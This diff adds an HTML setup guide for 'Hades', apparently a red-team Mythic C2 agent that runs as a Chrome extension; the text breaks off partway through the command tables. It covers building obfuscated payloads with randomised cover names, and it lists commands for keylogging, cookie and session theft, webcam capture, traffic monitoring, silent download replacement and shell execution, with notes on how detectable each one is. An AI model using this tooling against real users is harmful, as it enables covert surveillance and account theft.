@@ -1,0 +1,1822 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hades — Mythic C2 Chrome Extension Agent — Setup Guide</title>
+<style>
+  :root {
+    --bg: #1a1a1f;
+    --surface: #23232b;
+    --border: #35354a;
+    --accent: #7c6af5;
+    --accent2: #4fc3f7;
+    --text: #e2e2e8;
+    --muted: #9999b0;
+    --code-bg: #12121a;
+    --warn: #ffb347;
+    --green: #4caf7d;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    font-size: 15px;
+    line-height: 1.65;
+    padding: 0 1rem 4rem;
+  }
+  .page-wrap { max-width: 960px; margin: 0 auto; padding-top: 2rem; }
+  h1 { font-size: 2rem; color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: .5rem; margin-bottom: .25rem; }
+  h1 + p { color: var(--warn); font-size: .9rem; margin-bottom: 2rem; }
+  h2 { font-size: 1.45rem; color: var(--accent2); margin: 2.5rem 0 .75rem; border-bottom: 1px solid var(--border); padding-bottom: .3rem; }
+  h3 { font-size: 1.15rem; color: #c5bfff; margin: 1.75rem 0 .5rem; }
+  h4 { font-size: 1rem; color: var(--muted); margin: 1.25rem 0 .4rem; font-weight: 600; }
+  p { margin: .6rem 0; }
+  a { color: var(--accent2); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  ul, ol { margin: .5rem 0 .5rem 1.5rem; }
+  li { margin: .25rem 0; }
+  strong { color: #fff; }
+  em { color: var(--warn); font-style: normal; font-weight: 600; }
+  hr { border: none; border-top: 1px solid var(--border); margin: 2rem 0; }
+  code {
+    font-family: "JetBrains Mono", "Fira Code", "Cascadia Code", monospace;
+    font-size: .85em;
+    background: var(--code-bg);
+    color: #b8ffd8;
+    padding: .15em .4em;
+    border-radius: 4px;
+    border: 1px solid var(--border);
+  }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    border-radius: 6px;
+    padding: 1rem 1.25rem;
+    overflow-x: auto;
+    margin: .75rem 0;
+  }
+  pre code {
+    background: none;
+    border: none;
+    padding: 0;
+    color: #c8ffd4;
+    font-size: .82em;
+    line-height: 1.55;
+  }
+  table {
+    border-collapse: collapse;
+    width: 100%;
+    margin: .75rem 0;
+    font-size: .9rem;
+  }
+  th {
+    background: var(--surface);
+    color: var(--accent2);
+    font-weight: 600;
+    text-align: left;
+    padding: .5rem .75rem;
+    border: 1px solid var(--border);
+  }
+  td {
+    padding: .45rem .75rem;
+    border: 1px solid var(--border);
+    vertical-align: top;
+  }
+  tr:nth-child(even) td { background: #1e1e26; }
+  blockquote {
+    border-left: 3px solid var(--warn);
+    background: #2a2418;
+    padding: .6rem 1rem;
+    margin: .75rem 0;
+    border-radius: 0 6px 6px 0;
+    color: var(--warn);
+    font-size: .92rem;
+  }
+  blockquote p { margin: 0; }
+  blockquote strong { color: var(--warn); }
+  .toc { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1rem 1.5rem; margin-bottom: 2rem; }
+  .toc ul { list-style: none; margin: 0; padding: 0; }
+  .toc > ul > li { margin: .3rem 0; }
+  .toc a { color: var(--muted); font-size: .9rem; }
+  .toc a:hover { color: var(--accent2); }
+  .badge {
+    display: inline-block;
+    padding: .1em .5em;
+    border-radius: 4px;
+    font-size: .75em;
+    font-weight: 700;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    color: var(--muted);
+    vertical-align: middle;
+  }
+
+  .opsec-green { color: #4caf7d; }
+  .opsec-yellow { color: #ffb347; }
+  .opsec-red { color: #f44336; }
+</style>
+</head>
+<body>
+<div class="page-wrap">
+<h1 id="hades-mythic-custom-agent-setup-guide">Hades — Mythic Custom Agent Setup Guide<a class="headerlink" href="#hades-mythic-custom-agent-setup-guide" title="Permanent link">&para;</a></h1>
+<p><strong>For authorized security testing only.</strong></p>
+<hr />
+<h2 id="table-of-contents">Table of Contents<a class="headerlink" href="#table-of-contents" title="Permanent link">&para;</a></h2>
+<ol>
+<li><a href="#1-prerequisites">Prerequisites</a><br />
+1.5. <a href="#15-server-component-socks_bridgepy">Server Component</a></li>
+<li><a href="#2-install-mythic">Install Mythic</a></li>
+<li><a href="#3-install-c2-profile-containers">Install C2 Profiles</a></li>
+<li><a href="#4-install-the-hades-payload-type">Install Hades</a></li>
+<li><a href="#5-build-a-payload">Build a Payload</a></li>
+<li><a href="#6-load-the-extension-in-chrome">Load the Extension</a></li>
+<li><a href="#7-verify-the-callback">Verify the Callback</a></li>
+<li><a href="#8-available-commands">Available Commands</a></li>
+<li><a href="#9-native-messaging-host">Native Messaging Host</a></li>
+<li><a href="#10-ip-proxy">IP Proxy</a></li>
+<li><a href="#11-push-vs-poll--when-it-matters">Push vs Poll</a></li>
+<li><a href="#12-opsec-recommendations">Opsec Recommendations</a></li>
+<li><a href="#13-encryption--key-modes">Encryption &amp; Key Modes</a></li>
+<li><a href="#14-code-obfuscation">Code Obfuscation (detailed)</a></li>
+<li><a href="#15-modular-command-inclusion">Modular Command Inclusion</a></li>
+<li><a href="#16-filename--identity-randomisation">Filename &amp; Identity Randomisation</a></li>
+<li><a href="#17-iterating-on-the-agent">Iterating on the Agent</a></li>
+<li><a href="#18-troubleshooting">Troubleshooting</a></li>
+</ol>
+<hr />
+<h2 id="1-prerequisites">1. Prerequisites<a class="headerlink" href="#1-prerequisites" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Linux host (VM or cloud instance)</td>
+<td>Runs the Mythic server</td>
+</tr>
+<tr>
+<td>Docker + Docker Compose</td>
+<td>Required by Mythic</td>
+</tr>
+<tr>
+<td>Git</td>
+<td>To clone Mythic and C2 profiles</td>
+</tr>
+<tr>
+<td>Chrome browser on target</td>
+<td>The extension runs here</td>
+</tr>
+<tr>
+<td>Node.js (inside container)</td>
+<td>Installed automatically in the Hades Docker image for <code>javascript-obfuscator</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="15-server-component-socks_bridgepy">1.5 Server Component (socks_bridge.py)<a class="headerlink" href="#15-server-component-socks_bridgepy" title="Permanent link">&para;</a></h2>
+<p>The <code>server/socks_bridge.py</code> script runs on your C2 server alongside Mythic. It provides:<br />
+- <strong>SOCKS5 proxy</strong> on port 1080 (SSH tunnel to operator)<br />
+- <strong>WebSocket bridge</strong> for the extension connection</p>
+<p>Start it before using <code>ip_proxy_start</code>:</p>
+<pre><code class="language-bash">python3 server/socks_bridge.py
+</code></pre>
+<p>Configuration is via constants at the top of the file. The bridge auto-generates TLS certificates as needed.</p>
+<hr />
+<h2 id="2-install-mythic">2. Install Mythic<a class="headerlink" href="#2-install-mythic" title="Permanent link">&para;</a></h2>
+<p><strong>Step 1</strong> — Clone the Mythic repository:</p>
+<pre><code class="language-bash">git clone https://github.com/its-a-feature/Mythic
+cd Mythic
+</code></pre>
+<p><strong>Step 2</strong> — Start Mythic for the first time:</p>
+<pre><code class="language-bash">./mythic-cli start
+</code></pre>
+<p><strong>Step 3</strong> — Save the credentials printed to stdout (admin password, ports, etc.).</p>
+<p><strong>Step 4</strong> — Open the Mythic web UI at <code>https://&lt;your-mythic-host&gt;:7443</code> and log in.</p>
+<hr />
+<h2 id="3-install-c2-profile-containers">3. Install C2 Profile Containers<a class="headerlink" href="#3-install-c2-profile-containers" title="Permanent link">&para;</a></h2>
+<p>Hades supports two transport modes. Install both C2 profile containers:</p>
+<p><strong>Step 1</strong> — Install WebSocket (primary, push-based transport):</p>
+<pre><code class="language-bash">./mythic-cli install github https://github.com/MythicC2Profiles/websocket
+</code></pre>
+<p><strong>Step 2</strong> — Install HTTP (optional fallback, poll-based transport):</p>
+<pre><code class="language-bash">./mythic-cli install github https://github.com/MythicC2Profiles/http
+</code></pre>
+<p><strong>Step 3</strong> — Verify both are running:</p>
+<pre><code class="language-bash">./mythic-cli status
+</code></pre>
+<p>Both <code>websocket</code> and <code>http</code> should show as <code>running</code>.</p>
+<hr />
+<h2 id="4-install-the-hades-payload-type">4. Install the Hades Payload Type<a class="headerlink" href="#4-install-the-hades-payload-type" title="Permanent link">&para;</a></h2>
+<p><strong>Step 1</strong> — Transfer the <code>hades_public/</code> directory to your Mythic server.</p>
+<p><strong>Step 2</strong> — Install it as a local payload type:</p>
+<pre><code class="language-bash">sudo ./mythic-cli install folder /path/to/hades_public
+</code></pre>
+<p>Mythic copies it into <code>InstalledServices/hades/</code>, builds the Docker image (which includes<br />
+Node.js and <code>javascript-obfuscator</code>), and starts the container.</p>
+<p><strong>Step 3</strong> — Verify registration:</p>
+<pre><code class="language-bash">./mythic-cli status
+# hades should appear as running
+</code></pre>
+<p><strong>Step 4</strong> — Confirm in the Mythic UI: <strong>Payload Types</strong> should list <code>hades</code> with a green<br />
+heartbeat.</p>
+<h3 id="setting-the-agent-icon-optional">Setting the Agent Icon (optional)<a class="headerlink" href="#setting-the-agent-icon-optional" title="Permanent link">&para;</a></h3>
+<p>The icon file must be placed in the <strong>Mythic installation's</strong> <code>agent_icons/</code> directory<br />
+with a filename matching the payload type name exactly:</p>
+<pre><code class="language-bash">cp /path/to/hades_public/agent_icons/hades_icon.svg /path/to/Mythic/agent_icons/hades.svg
+./mythic-cli stop &amp;&amp; ./mythic-cli start
+</code></pre>
+<p>Or set it via the UI: <strong>Settings -&gt; Payload Types -&gt; hades -&gt; Edit Icon</strong></p>
+<hr />
+<h2 id="5-build-a-payload">5. Build a Payload<a class="headerlink" href="#5-build-a-payload" title="Permanent link">&para;</a></h2>
+<h3 id="step-1-navigate-to-the-payload-builder">Step 1 — Navigate to the payload builder<a class="headerlink" href="#step-1-navigate-to-the-payload-builder" title="Permanent link">&para;</a></h3>
+<p>In the Mythic UI: <strong>Payloads -&gt; Generate New Payload</strong></p>
+<h3 id="step-2-select-os-and-payload-type">Step 2 — Select OS and payload type<a class="headerlink" href="#step-2-select-os-and-payload-type" title="Permanent link">&para;</a></h3>
+<ul>
+<li>OS: <code>Chrome</code></li>
+<li>Payload type: <code>hades</code></li>
+</ul>
+<h3 id="step-3-configure-build-parameters">Step 3 — Configure build parameters<a class="headerlink" href="#step-3-configure-build-parameters" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Parameter</th>
+<th>Type</th>
+<th>Default</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>obfuscate</code></td>
+<td>Choice</td>
+<td><code>medium</code></td>
+<td>JavaScript obfuscation level (see <a href="#14-code-obfuscation">section 14</a>)</td>
+</tr>
+<tr>
+<td><code>native_host_features</code></td>
+<td>Choice</td>
+<td><code>proxy_only</code></td>
+<td>Features compiled into the native messaging host (see <a href="#9-native-messaging-host">section 9</a>)</td>
+</tr>
+<tr>
+<td><code>proxy_host_level</code></td>
+<td>Choice</td>
+<td><code>standard</code></td>
+<td>Native host encryption level: <code>standard</code> (PSK shown in build output) or <code>none</code> (PSK generated at install time)</td>
+</tr>
+<tr>
+<td><code>extension_name</code></td>
+<td>String</td>
+<td><em>(blank = random)</em></td>
+<td>Chrome extension display name shown in <code>chrome://extensions</code>. Leave blank for a random cover name (e.g. "Tab Manager Plus")</td>
+</tr>
+<tr>
+<td><code>extension_description</code></td>
+<td>String</td>
+<td><em>(blank = random)</em></td>
+<td>Extension description. Leave blank for a random cover description</td>
+</tr>
+<tr>
+<td><code>bg_filename</code></td>
+<td>String</td>
+<td><em>(blank = random)</em></td>
+<td>Background service worker filename (e.g. <code>sw.js</code>). Leave blank for a random name like <code>worker_c3d8.js</code></td>
+</tr>
+<tr>
+<td><code>keylogger_filename</code></td>
+<td>String</td>
+<td><em>(blank = random)</em></td>
+<td>Keylogger content script filename (e.g. <code>input.js</code>). Leave blank for random. Only included if <code>keylog</code> command is selected</td>
+</tr>
+<tr>
+<td><code>autofill_filename</code></td>
+<td>String</td>
+<td><em>(blank = random)</em></td>
+<td>Autofill content script filename (e.g. <code>forms.js</code>). Leave blank for random. Only included if <code>keylog</code> command is selected</td>
+</tr>
+<tr>
+<td><code>native_host_name</code></td>
+<td>String</td>
+<td><em>(blank = random)</em></td>
+<td>Native messaging host name registered with Chrome (e.g. <code>com.apple.webkit.helper</code>). Blank = randomised cover name</td>
+</tr>
+<tr>
+<td><code>proxy_host_level</code></td>
+<td>Choice</td>
+<td><code>standard</code></td>
+<td>Native host encryption: <code>standard</code> (PSK in build output) or <code>none</code> (PSK generated at install time)</td>
+</tr>
+<tr>
+<td><code>socks_psk</code></td>
+<td>String</td>
+<td><em>(blank)</em></td>
+<td>PSK for the Go SOCKS5 binary (<code>socks_start</code>). Must match <code>-X main.PSK=&lt;val&gt;</code> used when compiling the Go binary</td>
+</tr>
+<tr>
+<td><code>windows_launcher</code></td>
+<td>Choice</td>
+<td><code>none</code></td>
+<td>Windows native host launcher type — see below</td>
+</tr>
+<tr>
+<td><code>deploy_label</code></td>
+<td>String</td>
+<td><em>(blank)</em></td>
+<td>Optional label baked into payload — appears in callback Domain field to identify the deployment target</td>
+</tr>
+</tbody>
+</table>
+<p><strong><code>native_host_features</code> choices:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Choice</th>
+<th>Included capability</th>
+<th>Use case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>none</code></td>
+<td>Extension only, no native host</td>
+<td>Stealth-first; no disk artefacts from installer</td>
+</tr>
+<tr>
+<td><code>proxy_only</code></td>
+<td>IP proxy relay</td>
+<td>SOCKS tunnelling</td>
+</tr>
+<tr>
+<td><code>files_only</code></td>
+<td>File browser/download/upload</td>
+<td>File system access only</td>
+</tr>
+<tr>
+<td><code>exec_only</code></td>
+<td>Shell command execution</td>
+<td>RCE without proxy overhead</td>
+</tr>
+<tr>
+<td><code>proxy_and_files</code></td>
+<td>Proxy + file browser</td>
+<td>Combined recon and pivot</td>
+</tr>
+<tr>
+<td><code>proxy_and_exec</code></td>
+<td>Proxy + shell exec</td>
+<td>Proxy with on-host execution</td>
+</tr>
+<tr>
+<td><code>files_and_exec</code></td>
+<td>File browser + shell exec</td>
+<td>File + RCE without proxy</td>
+</tr>
+<tr>
+<td><code>all</code></td>
+<td>All three features</td>
+<td>Full capability</td>
+</tr>
+</tbody>
+</table>
+<p><strong><code>windows_launcher</code> choices</strong> <em>(only relevant for Windows targets)</em>:</p>
+<table>
+<thead>
+<tr>
+<th>Choice</th>
+<th>Process tree</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>none</code> <em>(default)</em></td>
+<td><code>Chrome → wscript.exe → python.exe</code></td>
+<td>VBScript fallback; avoids <code>cmd.exe</code>; no extra build step</td>
+</tr>
+<tr>
+<td><code>go_launcher</code></td>
+<td><code>Chrome → &lt;random&gt;.exe → python.exe</code></td>
+<td>Pre-compiled Go launcher cross-compiled in the Mythic container; launcher name randomised each build (e.g. <code>chrome_helper.exe</code>, <code>sync_b3a7.exe</code>); <code>python.exe</code> is a signed PSF binary; requires Go in the Mythic container (already in Dockerfile)</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>Selecting <code>go_launcher</code> triggers <code>GOOS=windows GOARCH=amd64 go build</code> during payload generation. The resulting <code>.exe</code> (~1.5 MB, stripped symbols) is included in the ZIP with a new random name on every build. On install, <code>install.py</code> scans for any <code>.exe</code> in its directory and uses it automatically — the name does not need to be known in advance.</p>
+</blockquote>
+<h3 id="step-4-configure-c2-profiles">Step 4 — Configure C2 profiles<a class="headerlink" href="#step-4-configure-c2-profiles" title="Permanent link">&para;</a></h3>
+<p>Add one or both transport profiles:</p>
+<p><strong>websocket</strong> <em>(primary — recommended)</em></p>
+<table>
+<thead>
+<tr>
+<th>Parameter</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>callback_host</code></td>
+<td>Your Mythic server IP or domain</td>
+</tr>
+<tr>
+<td><code>callback_port</code></td>
+<td><code>443</code> (prod) or <code>8081</code> (lab)</td>
+</tr>
+<tr>
+<td><code>ENDPOINT_REPLACE</code></td>
+<td><code>/</code></td>
+</tr>
+<tr>
+<td><code>encrypted_exchange_check</code></td>
+<td><code>true</code> (EKE — recommended) or <code>false</code> (static PSK)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>http</strong> <em>(optional — fallback transport)</em></p>
+<table>
+<thead>
+<tr>
+<th>Parameter</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>callback_host</code></td>
+<td>Your Mythic server IP or domain</td>
+</tr>
+<tr>
+<td><code>callback_port</code></td>
+<td><code>80</code> or <code>443</code></td>
+</tr>
+<tr>
+<td><code>ENDPOINT_REPLACE</code></td>
+<td><code>/</code></td>
+</tr>
+<tr>
+<td><code>encrypted_exchange_check</code></td>
+<td><code>true</code> or <code>false</code> (must match the websocket setting)</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Enabling EKE (RSA key exchange):</strong> The <code>encrypted_exchange_check</code> setting must be<br />
+<code>true</code> on the <strong>C2 profile instance</strong> <em>before</em> building. Mythic generates the RSA key<br />
+pair when the profile starts. If the profile was originally created with the setting<br />
+as <code>false</code>, the key parameter contains an AES key (32 bytes), not an RSA public key<br />
+(~550 bytes). To fix:</p>
+<ol>
+<li><strong>C2 Profiles</strong> in the Mythic UI -&gt; stop the profile</li>
+<li>Set <code>encrypted_exchange_check = true</code>, then restart the profile</li>
+<li>Now build the payload — the builder detects the RSA key automatically</li>
+</ol>
+<p>If the builder detects a short key despite EKE being requested, it falls back to PSK<br />
+mode and shows a warning in the build message.</p>
+</blockquote>
+<h3 id="step-5-select-commands">Step 5 — Select commands<a class="headerlink" href="#step-5-select-commands" title="Permanent link">&para;</a></h3>
+<p>On the <strong>Commands</strong> step, check the commands you want included. The builder strips code<br />
+for unselected commands from <code>background.js</code> (see <a href="#15-modular-command-inclusion">section 15</a>).</p>
+<ul>
+<li><strong><code>exit</code> must be selected</strong> or Mythic will warn "No exit command selected"</li>
+<li><code>sleep</code> and <code>exit</code> are always included regardless of selection</li>
+<li>Content scripts (<code>keylogger.js</code>, <code>autofill.js</code>) are only packaged if <code>keylog</code> is selected</li>
+<li>Using <strong>Select All</strong> is the easiest approach for full capability</li>
+</ul>
+<h3 id="step-6-generate-and-download">Step 6 — Generate and download<a class="headerlink" href="#step-6-generate-and-download" title="Permanent link">&para;</a></h3>
+<p>Click <strong>Generate</strong>. Download the resulting <code>.zip</code> file.</p>
+<p>The build message shows a summary: transport URLs, crypto mode, obfuscation level, number<br />
+of commands included, and which content scripts were excluded.</p>
+<blockquote>
+<p>When both profiles are configured, WebSocket is the primary transport and HTTP is the<br />
+fallback when the socket is unavailable.</p>
+</blockquote>
+<hr />
+<h2 id="6-load-the-extension-in-chrome">6. Load the Extension in Chrome<a class="headerlink" href="#6-load-the-extension-in-chrome" title="Permanent link">&para;</a></h2>
+<p><strong>Step 1</strong> — Unzip the downloaded <code>.zip</code> into a local folder.</p>
+<p><strong>Step 2</strong> — Open Chrome and navigate to <code>chrome://extensions</code>.</p>
+<p><strong>Step 3</strong> — Enable <strong>Developer mode</strong> (toggle in the top right).</p>
+<p><strong>Step 4</strong> — Click <strong>Load unpacked</strong> and select the unzipped folder.</p>
+<p>The extension loads immediately and connects back to Mythic. Within a few seconds a new<br />
+callback appears under <strong>Callbacks</strong>.</p>
+<hr />
+<h2 id="7-verify-the-callback">7. Verify the Callback<a class="headerlink" href="#7-verify-the-callback" title="Permanent link">&para;</a></h2>
+<p><strong>Step 1</strong> — In the Mythic UI, go to <strong>Callbacks</strong>.</p>
+<p><strong>Step 2</strong> — A new entry should appear showing the Chrome profile email, OS, architecture,<br />
+and a pseudo-PID (derived from the extension's unique ID — Chrome extensions cannot access<br />
+OS-level PIDs, so a stable hash of <code>chrome.runtime.id</code> is used instead).</p>
+<p><strong>Step 3</strong> — Click the callback to open the operator console.</p>
+<p><strong>Step 4</strong> — Test with: <code>sysinfo</code></p>
+<hr />
+<h2 id="8-available-commands">8. Available Commands<a class="headerlink" href="#8-available-commands" title="Permanent link">&para;</a></h2>
+<p><strong>Opsec legend:</strong> 🟢 Low — no new processes, no disk writes, invisible to user  /  🟡 Medium — detectable by monitoring or mildly visible  /  🔴 High — creates processes, writes disk, or visible to victim</p>
+<h3 id="core-agent-control">Core / Agent Control<a class="headerlink" href="#core-agent-control" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Noise</th>
+<th>Description</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sleep &lt;seconds&gt;</code></td>
+<td>🟢</td>
+<td>Change tasking poll interval</td>
+<td>Affects both WS and HTTP. No cap — keepalive is separate</td>
+</tr>
+<tr>
+<td><code>sysinfo</code></td>
+<td>🟢</td>
+<td>Platform, Chrome profile, env info. Adds OS-level data when native host active</td>
+<td>Queries native host if <code>native_start</code>/<code>ip_proxy_start</code> active</td>
+</tr>
+<tr>
+<td><code>idle</code></td>
+<td>🟢</td>
+<td>Query Chrome idle/locked state</td>
+<td>Threshold: 60 s inactivity</td>
+</tr>
+<tr>
+<td><code>uptime</code></td>
+<td>🟢</td>
+<td>Extension install age + service worker uptime</td>
+<td>--</td>
+</tr>
+<tr>
+<td><code>exit</code></td>
+<td>🟢</td>
+<td>Silently uninstall the extension</td>
+<td>Calls <code>chrome.management.uninstallSelf</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="screen-input">Screen / Input<a class="headerlink" href="#screen-input" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Noise</th>
+<th>Description</th>
+<th>ATT&amp;CK</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>screenshot</code></td>
+<td>🟢</td>
+<td>Capture the active window's visible tab as PNG</td>
+<td>T1113</td>
+</tr>
+<tr>
+<td><code>screenshot_all</code></td>
+<td>🟢</td>
+<td>Capture active tab of every open window → single HTML bundle</td>
+<td>T1113</td>
+</tr>
+<tr>
+<td><code>keylog</code></td>
+<td>🟡</td>
+<td>Start keystroke capture (flushes every 200 chars)</td>
+<td>T1056.001</td>
+</tr>
+<tr>
+<td><code>disable_keylog</code></td>
+<td>🟢</td>
+<td>Stop keylogger and flush remaining buffer</td>
+<td>T1056.001</td>
+</tr>
+<tr>
+<td><code>clipboard</code></td>
+<td>🟢</td>
+<td>Read current clipboard contents via active tab</td>
+<td>T1115</td>
+</tr>
+<tr>
+<td><code>geolocation</code></td>
+<td>🟡</td>
+<td>Pull lat/lon if active page has location permission</td>
+<td>T1430</td>
+</tr>
+<tr>
+<td><code>webcam</code></td>
+<td>🔴</td>
+<td>Capture webcam frame via active tab that has camera permission</td>
+<td>T1125</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><code>keylog</code> injects a content script that hooks <code>keydown</code> events — detectable by AV solutions monitoring DOM event listeners. <code>geolocation</code> and <code>webcam</code> only work on pages where the user has already granted the permission; some pages show a camera/location indicator.</p>
+</blockquote>
+<h3 id="browser-data-collection">Browser Data Collection<a class="headerlink" href="#browser-data-collection" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Noise</th>
+<th>Description</th>
+<th>ATT&amp;CK</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>dump_cookies</code></td>
+<td>🟢</td>
+<td>Dump all browser cookies as JSON</td>
+<td>T1539</td>
+</tr>
+<tr>
+<td><code>dump_tabs</code></td>
+<td>🟢</td>
+<td>List all open tabs (title, URL, status)</td>
+<td>T1217</td>
+</tr>
+<tr>
+<td><code>history</code></td>
+<td>🟢</td>
+<td>Browser history — text ≤100 entries, file &gt;100</td>
+<td>T1217</td>
+</tr>
+<tr>
+<td><code>bookmarks</code></td>
+<td>🟢</td>
+<td>Full bookmark tree as plain text</td>
+<td>T1217</td>
+</tr>
+<tr>
+<td><code>local_storage</code></td>
+<td>🟢</td>
+<td>Dump active tab's <code>localStorage</code> and <code>sessionStorage</code></td>
+<td>T1539, T1552</td>
+</tr>
+<tr>
+<td><code>session_export [origin]</code></td>
+<td>🟢</td>
+<td>Full session package: cookies + localStorage + sessionStorage</td>
+<td>T1539, T1185</td>
+</tr>
+<tr>
+<td><code>find_in_dom &lt;pattern&gt; [flags]</code></td>
+<td>🟢</td>
+<td>Regex search across all open tab DOMs (up to 50 matches/tab)</td>
+<td>T1552, T1005</td>
+</tr>
+<tr>
+<td><code>notifications</code></td>
+<td>🟢</td>
+<td><code>Notification.permission</code> state for all tabs</td>
+<td>T1082</td>
+</tr>
+<tr>
+<td><code>download_history [limit] [url_filter]</code></td>
+<td>🟢</td>
+<td>Browser download history — text ≤100, file &gt;100</td>
+<td>T1005</td>
+</tr>
+</tbody>
+</table>
+<p>All browser data collection commands use Chrome extension APIs only — no disk access, no subprocesses, no network calls beyond what the victim's browser is already doing.</p>
+<h3 id="navigation-injection">Navigation / Injection<a class="headerlink" href="#navigation-injection" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Noise</th>
+<th>Description</th>
+<th>ATT&amp;CK</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>inject_tab &lt;current\|new&gt; &lt;url&gt;</code></td>
+<td>🟡</td>
+<td>Navigate active tab or open new tab to a URL</td>
+<td>T1185</td>
+</tr>
+<tr>
+<td><code>download_url &lt;url&gt; [filename]</code></td>
+<td>🟡</td>
+<td>Fetch URL using browser's live cookie jar; returns as file</td>
+<td>T1530, T1005</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><code>inject_tab</code> is visible to the victim — they see their browser navigate. <code>download_url</code> generates a server-side request log with the browser's cookies and UA.</p>
+</blockquote>
+<h3 id="installed-software">Installed Software<a class="headerlink" href="#installed-software" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Noise</th>
+<th>Description</th>
+<th>ATT&amp;CK</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>list_extensions</code></td>
+<td>🟢</td>
+<td>All installed Chrome extensions with IDs, permissions, and install type</td>
+<td>T1518</td>
+</tr>
+<tr>
+<td><code>list_pwas</code></td>
+<td>🟢</td>
+<td>Installed Progressive Web Apps and hosted/packaged apps</td>
+<td>T1518</td>
+</tr>
+<tr>
+<td><code>check_permissions</code></td>
+<td>🟢</td>
+<td>Report which sensitive Chrome API permissions the extension holds</td>
+<td>T1082</td>
+</tr>
+</tbody>
+</table>
+<h3 id="network-monitoring">Network Monitoring<a class="headerlink" href="#network-monitoring" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Noise</th>
+<th>Description</th>
+<th>ATT&amp;CK</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>network_monitor_start</code></td>
+<td>🟡</td>
+<td>Log all browser HTTP/HTTPS requests (URL, method, status, content-type)</td>
+<td>T1040, T1557</td>
+</tr>
+<tr>
+<td><code>network_monitor_stop</code></td>
+<td>🟢</td>
+<td>Stop monitoring; returns ≤100 lines as text, &gt;100 as file</td>
+<td>T1040</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>Installs a <code>chrome.webRequest</code> listener — active listeners are visible to security extensions or browser inspection tools. Stop promptly; auth headers in captured traffic are sensitive.</p>
+</blockquote>
+<h3 id="download-interception">Download Interception<a class="headerlink" href="#download-interception" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Noise</th>
+<th>Description</th>
+<th>ATT&amp;CK</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>download_watch</code></td>
+<td>🟢</td>
+<td>Real-time feed of every download the user initiates</td>
+<td>T1005</td>
+</tr>
+<tr>
+<td><code>download_watch_stop</code></td>
+<td>🟢</td>
+<td>Stop watch and return summary</td>
+<td>T1005</td>
+</tr>
+<tr>
+<td><code>download_intercept_start</code></td>
+<td>🔴</td>
+<td>Cancel a matching download and silently replace it with a custom file</td>
+<td>T1036, T1565</td>
+</tr>
+<tr>
+<td><code>download_intercept_stop [pattern]</code></td>
+<td>🟢</td>
+<td>Remove one rule by pattern, or all rules if blank</td>
+<td>T1036</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><code>download_intercept_start</code> is the noisiest extension command — the original file disappears and a different file appears. Users frequently notice. The replacement saves with the original filename via <code>chrome.downloads.onDeterminingFilename</code>.</p>
+</blockquote>
+<p><code>download_intercept_start</code> parameters:</p>
+<table>
+<thead>
+<tr>
+<th>Parameter</th>
+<th>Required</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>pattern</code></td>
+<td>Yes</td>
+<td>URL or filename substring to match (case-insensitive)</td>
+</tr>
+<tr>
+<td><code>content_b64</code></td>
+<td>Either/or</td>
+<td>Base64-encoded replacement file content (small files)</td>
+</tr>
+<tr>
+<td><code>replace_url</code></td>
+<td>Either/or</td>
+<td>URL to fetch replacement from at intercept time (large files)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="native-host-activation">Native Host — Activation<a class="headerlink" href="#native-host-activation" title="Permanent link">&para;</a></h3>
+<p><em>Requires native host installed on victim. See <a href="#9-native-messaging-host">section 9</a>.</em></p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Noise</th>
+<th>Description</th>
+<th>ATT&amp;CK</th>
+</tr>
+</thead>
+<tbody>
+<tr>
